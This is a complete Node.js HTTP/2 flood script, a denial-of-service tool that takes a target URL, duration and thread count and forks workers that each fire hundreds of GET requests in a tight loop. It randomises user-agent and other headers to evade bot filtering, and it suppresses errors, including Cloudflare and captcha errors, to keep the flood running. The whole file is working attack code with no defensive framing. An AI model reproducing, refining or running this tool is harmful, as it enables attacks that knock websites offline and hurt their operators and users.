const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  cluster = require('cluster'),
  fakeua = require('fake-useragent'),
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
  ],
  encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
  ],
  controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
  ],
  ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
  ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  //console.warn(e);
}).on('unhandledRejection', function (e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  //console.warn(e);
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  //console.warn(e);
}).setMaxListeners(0);

function randomItem(array) {
  return array[Math.floor(Math.random() * array.length)];
}

function accept() {
  return randomItem(accept_header);
}

function lang() {
  return randomItem(lang_header);
}

function encoding() {
  return randomItem(encoding_header);
}

function controling() {
  return randomItem(controle_header);
}

const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4];

if (cluster.isMaster) {
  const dateObj = new Date();

  console.log(`\x1b[36mURL: \x1b[37m${url.parse(target).host}\n\x1b[36mThread: \x1b[37m${thread}\n\x1b[36mTime: \x1b[37m${time}\n\x1b[36mTimestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);

  for (var bb = 0; bb < thread; bb++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(-1)
  }, time * 1000)
} else {
  function flood() {
    var parsed = url.parse(target);

    const uas = fakeua();

    var header = {
      ":path": parsed.path,
      ":method": "GET",
      "User-agent": uas,
      "Accept": accept(),
      "Accept-Encoding": encoding(),
      "Accept-Language": lang(),
      "Cache-Control": controling(),
    };

    const client = http2.connect(parsed.href);

    client.on('error', (err) => {
      // Xử lý lỗi kết nối HTTP/2
    });

    for (let i = 0; i < 200; i++) {
      const req = client.request(header);

      req.on('response', (headers) => {
        // Xử lý phản hồi từ máy chủ
        req.close();
      });

      req.end();
    }
  }

  setInterval(() => {
    flood()
  })
}

